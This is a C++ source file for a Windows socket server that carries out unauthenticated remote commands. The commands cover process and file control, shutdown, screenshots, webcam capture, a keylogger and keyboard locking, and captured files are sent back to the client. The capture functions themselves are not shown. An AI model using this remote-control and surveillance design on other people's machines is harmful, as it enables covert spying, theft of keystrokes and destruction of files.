#include "socket.h"
#include "const.h"
#include "syscalls.h"
#include <unordered_map>

// Request
static void handleRequest(std::string& request, std::string& response, std::string params, std::ifstream& file) {
	COMMANDS command = commandMap.find(request) != commandMap.end() ? commandMap.at(request) : INVALID;
	try {
		switch (command) {
		case LIST_PROCESS:
			listProcess(response);
			break;
		case START_PROCESS:
			startProcess(params, response);
			break;
		case STOP_PROCESS:
			stopProcess(params, response);
			break;
		case SHUTDOWN:
			shutdown(response);
			break;
		case RESTART:
			restart(response);
			break;
		case DELETE_FILE:
			deleteFile(params, response);
			break;
		case MOVE_FILE:
			moveFile(params, response);
			break;
		case COPY_FILE:
			copyFile(params, response);
			break;
		case CAPTURE_SCREENSHOT:
			captureScreenshot(response, file);
			break;
		case START_WEBCAM:
			startWebcam(response);
			break;
		case STOP_WEBCAM:
			stopWebcam(response, file);
			break;
		case LIST_APPS:
			listApps(response);
			break;
		case START_APP:
			startApp(params, response);
			break;
		case STOP_APP:
			stopApp(params, response);
			break;
		case START_KEYLOGGER:
			startKeylogger(response);
			break;
		case STOP_KEYLOGGER:
			stopKeylogger(response, file);
			break;
		case LOCK_KEYBOARD:
			lockKeyboard(response);
			break;
		case UNLOCK_KEYBOARD:
			unlockKeyboard(response);
			break;
		default:
			//std::cout << request << '\n';
			response = "Invalid command.";
			break;
		}
	}
	catch (std::exception& e) {
		response = "An error occurred: " + std::string(e.what()) + "\n";
	}
}

bool initializeWinsock(WSADATA& wsaData)
{
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		std::cerr << "WSAStartup failed with error: " << iResult << std::endl;
		return false;
	}
	return true;
}

bool setupSocket(SOCKET& ListenSocket, addrinfo*& result)
{
	struct addrinfo hints = {};
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	int iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0)
	{
		std::cerr << "getaddrinfo failed with error: " << iResult << std::endl;
		WSACleanup();
		return false;
	}

	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET)
	{
		std::cerr << "Socket failed with error: " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		WSACleanup();
		return false;
	}

	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR)
	{
		std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return false;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR)
	{
		std::cerr << "Listen failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ListenSocket);
		WSACleanup();
		return false;
	}
	return true;
}

void printIPAddress(const sockaddr_in& addr)
{
	// Run ipconfig in cmd to get the IP address
	std::string res = exec("ipconfig");
	std::vector<std::string> lines = findAllLines(res, "IPv4 Address");
	for (const auto& line : lines) {
		// Get only the IP address
		std::string ip = line.substr(line.find(":") + 2);
		std::cout << "Listening on " << ip << ":" << ntohs(addr.sin_port) << std::endl;
	}
}

void printListeningInfo(SOCKET& ListenSocket)
{
	struct sockaddr_in addr;
	int addrlen = sizeof(addr);
	getsockname(ListenSocket, (struct sockaddr*)&addr, &addrlen);

	printIPAddress(addr);

	std::cout << "Waiting for client connection...\n";
}

SOCKET acceptClient(SOCKET& ListenSocket)
{
	SOCKET ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET)
	{
		std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
		closesocket(ListenSocket);
		WSACleanup();
	}
	else
	{
		std::cout << "Connection established!" << std::endl;
	}
	return ClientSocket;
}

void sendFile(SOCKET& ClientSocket, std::ifstream& file, std::string command)
{
	// Send response type
	send(ClientSocket, "file", 4, 0);

	std::string fileName = filePaths.find(command) != filePaths.end() ? filePaths.at(command) : "unknown";

	// Send file name
	send(ClientSocket, fileName.c_str(), fileName.size(), 0);

	// Send file size
	file.seekg(0, std::ios::end);
	unsigned long long fileSize = std::filesystem::file_size(fileName);
	send(ClientSocket, (char*)&fileSize, sizeof(fileSize), 0);

	file.seekg(0, std::ios::beg);  // Rewind the file to start sending

	char buffer[DEFAULT_BUFLEN];

	int iResult;
	while (file.read(buffer, DEFAULT_BUFLEN)) {
		iResult = send(ClientSocket, buffer, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
			break;
		}
		//std::cout << i++ << ' ';
	}
	// Send any remaining bytes
	iResult = send(ClientSocket, buffer, file.gcount(), 0);
	file.close();
}

void sendResponse(SOCKET& ClientSocket, std::string& response)
{
	send(ClientSocket, "text", 4, 0);

	// Send response size first
	int responseSize = response.size();
	send(ClientSocket, (char*)&responseSize, sizeof(responseSize), 0);

	// Send response
	int iResult;
	while (response.size() > 0) {
		iResult = send(ClientSocket, response.c_str(), response.size(), 0);
		if (iResult == SOCKET_ERROR) {
			std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
			break;
		}
		response.erase(0, iResult);
	}
}

void processRequest(SOCKET& ClientSocket, const std::string& request)
{
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;

	std::size_t pos = request.find(' ');
	std::string command = request.substr(0, pos);
	std::string params = request.substr(pos + 1);
	std::ifstream file;
	std::string response;

	handleRequest(command, response, params, file);

	if (file.is_open())
	{
		sendFile(ClientSocket, file, command);
	}
	else
	{
		sendResponse(ClientSocket, response);
	}
}

void handleClient(SOCKET& ClientSocket)
{
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;
	int iResult;

	while (true)
	{
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
		{
			std::string request(recvbuf, iResult);
			std::cout << "Client: " << request << std::endl;

			if (request == "exit") {
				return;
			}
			// Process and send response
			processRequest(ClientSocket, request);
		}
		else if (iResult == 0)
		{
			std::cout << "Connection closing...\n";
			break;
		}
		else
		{
			std::cerr << "Recv failed with error: " << WSAGetLastError() << std::endl;
			break;
		}
	}
}

void cleanup(SOCKET& ClientSocket)
{
	closesocket(ClientSocket);
	WSACleanup();
}